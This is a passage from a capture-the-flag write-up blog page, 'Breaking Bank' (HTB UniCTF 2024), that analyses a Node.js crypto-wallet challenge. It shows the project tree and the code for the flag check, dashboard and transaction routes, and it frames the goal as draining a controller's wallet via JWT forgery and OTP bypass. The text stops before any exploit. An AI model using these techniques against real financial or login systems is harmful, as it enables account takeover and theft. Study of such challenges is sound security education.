<!doctype html><html lang="en"><head><title>Breaking Bank | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HTB UniCTF 2024. Open Redirect. JWKS and JWT forgery. OTP bypass"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB UniCTF 2024. Open Redirect. JWKS and JWT forgery. OTP bypass"><meta itemprop="keywords" content><meta itemprop="name" content="Breaking Bank"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HTB UniCTF 2024. Open Redirect. JWKS and JWT forgery. OTP bypass"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Breaking Bank"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/htb-unictf/breaking-bank/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HTB UniCTF 2024. Open Redirect. JWKS and JWT forgery. OTP bypass"><meta name="twitter:description" content="HTB UniCTF 2024. Open Redirect. JWKS and JWT forgery. OTP bypass"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:title" content="Breaking Bank"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/htb-unictf/breaking-bank/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB UNICTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/htb-unictf/breaking-bank/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/htb-unictf/breaking-bank/&amp;text=Breaking%20Bank" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/htb-unictf/breaking-bank/&amp;title=Breaking%20Bank" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Breaking Bank</h1><p class="mb4 f6 dib tracked">12 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#finding-the-objective">Finding the objective</a></li><li><a href="#session-management">Session management</a></li><li><a href="#otp-implementation">OTP implementation</a></li></ul></li><li><a href="#solution">Solution</a><ul><li><a href="#jwks-forgery">JWKS forgery</a></li><li><a href="#manual-solution">Manual solution</a></li><li><a href="#automated-solution">Automated solution</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a web project using Fastify and Node.js in the backend and React on the frontend:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span> -L 4
.
├── Dockerfile
├── build-docker.sh
├── challenge
│   ├── components.json
│   ├── eslint.config.js
│   ├── index.html
│   ├── package.json
│   ├── postcss.config.js
│   ├── public
│   │   ├── favicon.webp
│   │   └── logo.webp
│   ├── server
│   │   ├── index.js
│   │   ├── middleware
│   │   │   ├── jwksMiddleware.js
│   │   │   ├── otpMiddleware.js
│   │   │   └── rateLimiterMiddleware.js  
│   │   ├── package.json
│   │   ├── routes
│   │   │   ├── analytics.js
│   │   │   ├── auth.js
│   │   │   ├── crypto.js
│   │   │   ├── dashboard.js
│   │   │   ├── jwks.js
│   │   │   └── users.js
│   │   ├── services
│   │   │   ├── analyticsService.js
│   │   │   ├── coinService.js
│   │   │   ├── flagService.js
│   │   │   ├── initializer.js
│   │   │   ├── jwksService.js
│   │   │   ├── otpService.js
│   │   │   ├── transactionService.js
│   │   │   └── userService.js
│   │   └── utils
│   │       ├── redisClient.js
│   │       └── redisUtils.js
│   ├── src
│   │   ├── App.css
│   │   ├── App.tsx
│   │   ├── components
│   │   │   ├── Layout.tsx
│   │   │   ├── LogoutButton.tsx
│   │   │   ├── MarketingCTA.tsx
│   │   │   ├── ProtectedRoute.tsx
│   │   │   ├── mode-toggle.tsx
│   │   │   ├── theme-provider.tsx
│   │   │   └── ui
│   │   ├── context
│   │   │   └── FriendsContext.tsx
│   │   ├── hooks
│   │   │   └── use-toast.ts
│   │   ├── index.css
│   │   ├── lib
│   │   │   └── utils.ts
│   │   ├── main.tsx
│   │   ├── pages
│   │   │   ├── Dashboard.tsx
│   │   │   ├── Friends.tsx
│   │   │   ├── Login.tsx
│   │   │   ├── Market.tsx
│   │   │   ├── Portfolio.tsx
│   │   │   ├── Register.tsx
│   │   │   └── Transaction.tsx
│   │   └── vite-env.d.ts
│   ├── tailwind.config.js
│   ├── tsconfig.app.json
│   ├── tsconfig.json
│   ├── tsconfig.node.json
│   └── vite.config.ts
├── config
│   ├── nginx.conf
│   └── supervisord.conf
├── flag.txt
└── htb
    └── wrapper.py

16 directories, 60 files
</code></pre></div><p>I will be using the Docker container for local development, because we will need to automate the solution in a script. Then, we only need to spawn the remote instance and run the script to get the flag.</p><h2 id="source-code-analysis">Source code analysis</h2><p>There are a lot of files to read. However, instead of reading each of them one by one, it is better to go backwards.</p><h3 id="finding-the-objective">Finding the objective</h3><p>For example, the flag is stored as a file (<code>flag.txt</code>), so we must find places where this file is used, and it only appears at <code>challenge/server/services/flagService.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { getBalancesForUser } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../services/coinService.js'</span><span class="mtk1">;</span>
<span class="mtk5">import</span><span class="mtk1"> fs </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'fs/promises'</span><span class="mtk1">;</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">FINANCIAL_CONTROLLER_EMAIL</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"financial-controller@frontier-board.htb"</span><span class="mtk1">;</span>  

<span class="mtk3">/**</span>
<span class="mtk3"> * Checks if the financial controller's CLCR walle</span><span class="mtk3">t is drained</span>
<span class="mtk3"> * If drained, returns the flag.</span>
<span class="mtk3"> */</span>
<span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">checkFinancialControllerDrained</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">balances</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">getBalancesForUser</span><span class="mtk1">(</span><span class="mtk1">FINANCIAL_CONTROLLER_EMAIL</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">clcrBalance</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">balances</span><span class="mtk1">.</span><span class="mtk8">find</span><span class="mtk1">((</span><span class="mtk9 mtki">coin</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">coin</span><span class="mtk1">.</span><span class="mtk1">symbol</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'CLCR'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">clcrBalance</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">clcrBalance</span><span class="mtk1">.</span><span class="mtk1">availableBalance</span><span class="mtk1"> </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk5">await</span><span class="mtk1"> fs.</span><span class="mtk8">readFile</span><span class="mtk1">(</span><span class="mtk4">'/flag.txt'</span><span class="mtk1">, </span><span class="mtk4">'utf-8'</span><span class="mtk1">)).</span><span class="mtk8">trim</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> { </span><span class="mtk1">drained</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">, </span><span class="mtk1">flag</span><span class="mtk1"> };</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> { </span><span class="mtk1">drained</span><span class="mtk1">: </span><span class="mtk6">false</span><span class="mtk1"> };</span>
<span class="mtk1">};</span>
</code></pre></div><p>This function <code>checkFinancialControllerDrained</code> simply checks if the balance of the <code>FINANCIAL_CONTROLLER_EMAIL</code> user is zero. If so happens, the flag will be returned. This function is called from <code>challenge/server/routes/dashboard.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { checkFinancialControllerDrained } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">'../services/flagService.js'</span><span class="mtk1">;</span>

<span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk5">default</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">dashboardRouter</span><span class="mtk1">(</span><span class="mtk9 mtki">fastify</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk9 mtki">fastify</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">reply</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.user) {</span>
<span class="mtk1">            </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">401</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Unauthorized: User not authenticated'</span><span class="mtk1"> });</span>  
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">email</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.user;</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">email</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">'Email not found in token'</span><span class="mtk1"> });</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">drained</span><span class="mtk1">, </span><span class="mtk1">flag</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">checkFinancialControllerDrained</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">drained</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'Welcome to the Dashboard!'</span><span class="mtk1">, </span><span class="mtk1">flag</span><span class="mtk1"> });</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'Welcome to the Dashboard!'</span><span class="mtk1"> });</span>
<span class="mtk1">    });</span>
<span class="mtk1">}</span>
</code></pre></div><p>With this, we already know that the objective is to drain the balance of <code>FINANCIAL_CONTROLLER_EMAIL</code>. There is a way to perform transactions in <code>challenge/server/routes/crypto.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">
<span class="mtk1">    </span><span class="mtk9 mtki">fastify</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span>
<span class="mtk1">        </span><span class="mtk4">'/transaction'</span><span class="mtk1">,</span>
<span class="mtk1">        { </span><span class="mtk1">preHandler</span><span class="mtk1">: [</span><span class="mtk8">rateLimiterMiddleware</span><span class="mtk1">(), </span><span class="mtk8">otpMiddleware</span><span class="mtk1">()] },</span>
<span class="mtk1">        </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">reply</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">          </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">to</span><span class="mtk1">, </span><span class="mtk1">coin</span><span class="mtk1">, </span><span class="mtk1">amount</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.body;</span>
<span class="mtk1">          </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userId</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.user.email; </span>
<span class="mtk1">      </span>
<span class="mtk1">          </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">to</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">coin</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk1">amount</span><span class="mtk1">) {</span>
<span class="mtk1">              </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">"Missing required fields"</span><span class="mtk1"> });</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span>
<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">supportedCoins</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">getSupportedCoins</span><span class="mtk1">(); </span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">supportedCoins</span><span class="mtk1">.</span><span class="mtk8">includes</span><span class="mtk1">(</span><span class="mtk1">coin</span><span class="mtk1">.</span><span class="mtk8">toUpperCase</span><span class="mtk1">())) {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">"Unsupported coin symbol."</span><span class="mtk1"> });</span>
<span class="mtk1">            }</span>
<span class="mtk1">            </span>
<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">parsedAmount</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">parseFloat</span><span class="mtk1">(</span><span class="mtk1">amount</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isNaN</span><span class="mtk1">(</span><span class="mtk1">parsedAmount</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">parsedAmount</span><span class="mtk1"> </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">              </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">"Amount must be a positive number."</span><span class="mtk1"> });</span>
<span class="mtk1">            }</span>

<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">userExists</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">validateUserExists</span><span class="mtk1">(</span><span class="mtk1">to</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">userExists</span><span class="mtk1">) {</span>
<span class="mtk1">              </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">404</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">"Recipient user does not exist."</span><span class="mtk1"> });</span>
<span class="mtk1">            }</span>
<span class="mtk1">      </span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">userId</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk1">to</span><span class="mtk1">) {</span>
<span class="mtk1">              </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">reply</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">400</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({ </span><span class="mtk1">error</span><span class="mtk1">: </span><span class="mtk4">"Cannot perform transactions to yourself."</span><span class="mtk1"> });</span>
<span class="mtk1">            }</span>

<span class="mtk1">            </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">transactionByEmail</span><span class="mtk1">(</span><span class="mtk1">to</span><span class="mtk1">, </span><span class="mtk1">userId</span><span class="mtk1">, </span><span class="mtk7">parseFloat</span><span class="mtk1">(</span><span class="mtk1">amount</span><span class="mtk1">), </span><span class="mtk1">coin</span><span class="mtk1">.</span><span class="mtk8">toUpperCase</span><span class="mtk1">());</span>
<span class="mtk1">      </span>
